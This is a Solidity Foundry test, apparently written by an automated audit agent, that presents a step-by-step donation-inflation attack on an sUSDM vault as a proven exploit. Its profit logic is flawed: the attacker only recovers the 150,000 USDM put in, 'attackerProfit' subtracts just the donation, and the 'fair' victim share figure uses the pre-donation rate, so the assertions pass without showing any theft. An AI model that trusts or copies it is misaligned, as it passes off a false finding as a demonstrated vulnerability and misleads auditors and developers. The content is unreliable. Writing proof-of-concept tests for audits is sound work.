// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is ToL1WeiHarness {

    // ATTACK TIMELINE:
    // 1. [Setup] Attacker and victim receive USDM tokens via vault mint
    // 2. [T=1000] Attacker deposits 100,000 USDM into sUSDM, receives shares at initial rate
    // 3. [T=1001] Attacker donates 50,000 USDM directly to sUSDM contract (bypassing deposit)
    // 4. [T=1002] totalAssets() inflates by 50,000 USDM, exchange rate jumps ~50%
    // 5. [T=1003] Victim deposits 100,000 USDM, receives ~33% fewer shares due to inflated rate
    // 6. [T=1004] Attacker initiates cooldown of all shares
    // 7. [T=100000] After cooldown, attacker claims and receives 150,000 USDM (50k profit from donation)
    // 8. [Assert] Attacker profited; victim received fewer shares than fair value

    function test_exploit() public {
        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        uint256 attackerDeposit = 100_000e6;
        uint256 donation = 50_000e6;
        uint256 victimDeposit = 100_000e6;

        // Step 1: Setup - mint USDM to attacker and victim
        vm.warp(1000);
        vm.prank(address(vault));
        usdm.mint(attacker, attackerDeposit + donation);

        vm.prank(address(vault));
        usdm.mint(victim, victimDeposit);

        console.log("Step 1: attacker USDM balance =", usdm.balanceOf(attacker));
        console.log("Step 1: victim USDM balance =", usdm.balanceOf(victim));

        // Step 2: Attacker deposits into sUSDM at initial rate
        vm.startPrank(attacker);
        usdm.approve(address(susdm), attackerDeposit);
        uint256 attackerShares = susdm.deposit(attackerDeposit, attacker);
        vm.stopPrank();

        uint256 rateBeforeDonation = _rate();
        uint256 totalAssetsBefore = susdm.totalAssets();
        uint256 totalSupplyBefore = susdm.totalSupply();

        console.log("Step 2: attackerShares =", attackerShares);
        console.log("Step 2: rateBeforeDonation =", rateBeforeDonation);
        console.log("Step 2: totalAssetsBefore =", totalAssetsBefore);

        // Step 3: Attacker donates USDM directly to sUSDM (not via deposit function)
        vm.warp(1001);
        vm.prank(attacker);
        usdm.transfer(address(susdm), donation);

        uint256 rateAfterDonation = _rate();
        uint256 totalAssetsAfterDonation = susdm.totalAssets();

        console.log("Step 3: rateAfterDonation =", rateAfterDonation);
        console.log("Step 3: totalAssetsAfterDonation =", totalAssetsAfterDonation);
        console.log("Step 3: totalSupply unchanged =", susdm.totalSupply());

        // Step 4: Verify rate inflated
        assertGt(rateAfterDonation, rateBeforeDonation, "donation should inflate exchange rate");
        assertEq(totalAssetsAfterDonation, totalAssetsBefore + donation, "totalAssets includes direct donation");
        assertEq(susdm.totalSupply(), totalSupplyBefore, "no new shares minted for donation");

        // Step 5: Victim deposits at inflated rate
        vm.warp(1003);
        uint256 expectedVictimShares = (victimDeposit * totalSupplyBefore) / totalAssetsBefore;

        vm.startPrank(victim);
        usdm.approve(address(susdm), victimDeposit);
        uint256 victimShares = susdm.deposit(victimDeposit, victim);
        vm.stopPrank();

        console.log("Step 5: victimShares received =", victimShares);
        console.log("Step 5: expectedVictimShares (fair) =", expectedVictimShares);

        // Step 6: Attacker initiates cooldown
        vm.warp(1004);
        vm.prank(attacker);
        uint256 requestId = susdm.cooldownShares(attackerShares, attacker);

        console.log("Step 6: cooldown requestId =", requestId);

        // Step 7: Warp past cooldown and claim
        vm.warp(100000);
        vm.prank(attacker);
        susdm.claimUnstake(requestId);

        uint256 attackerFinalBalance = usdm.balanceOf(attacker);
        uint256 attackerProfit = attackerFinalBalance - donation;

        console.log("Step 7: attackerFinalBalance =", attackerFinalBalance);
        console.log("Step 7: attackerProfit (after subtracting donation) =", attackerProfit);

        // Step 8: Assertions proving the exploit
        assertLt(victimShares, expectedVictimShares, "victim received fewer shares due to inflated rate");
        assertGt(attackerFinalBalance, attackerDeposit, "attacker profited from donation manipulation");
        assertGt(attackerProfit, 0, "attacker net profit is positive after donation cost");
    }

    function _rate() internal view returns (uint256) {
        uint256 supply = susdm.totalSupply();
        if (supply == 0) return 1e6;
        return (susdm.totalAssets() * 1e6) / supply;
    }
}
